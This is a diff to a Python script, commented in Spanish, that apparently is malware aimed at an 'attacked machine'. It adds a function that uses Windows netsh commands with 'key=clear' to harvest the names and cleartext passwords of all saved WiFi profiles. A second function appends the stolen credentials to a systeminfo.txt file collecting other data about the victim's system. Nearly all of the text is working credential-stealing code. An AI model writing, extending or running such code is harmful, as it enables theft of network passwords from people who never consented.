@@ -61,6 +61,39 @@ for dependencia in dependencias:
         except subprocess.CalledProcessError:
             print(f'Error al instalar la dependencia {dependencia}.')
 
+#Funcion que captura los nombres y las contraseñas de los wifis los quales la maquina atacada tiene guardados.
+def get_wifi_info():
+    try:
+        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+        wifi_info = []
+
+        for i in profiles:
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+            try:
+                wifi_info.append(f"{i}: {results[0]}\n")
+            except IndexError:
+                wifi_info.append(f"{i}: \n")
+        return "\n".join(wifi_info)
+    except subprocess.CalledProcessError:
+        return "No se pudo obtener información de WiFi"
+
+#Añade la información al archivo systeminfo.txt
+def append_wifi_info_to_system_info():
+    wifi_info = get_wifi_info()
+
+    # Leer el contenido actual del archivo systeminfo.txt
+    with open(system_information, "r") as f:
+        existing_content = f.read()
+
+    # Abrir el archivo en modo de escritura y agregar la información al final
+    with open(system_information, "w") as f:
+        f.write(existing_content)
+        f.write("\n\n=== WiFi Information ===\n")
+        f.write(wifi_info)
+append_wifi_info_to_system_info()
+
 #Funcion que captura información del sistema tal como el Sistema operativo o la IP.
 def computer_information():
     with open(system_information, "w") as f:
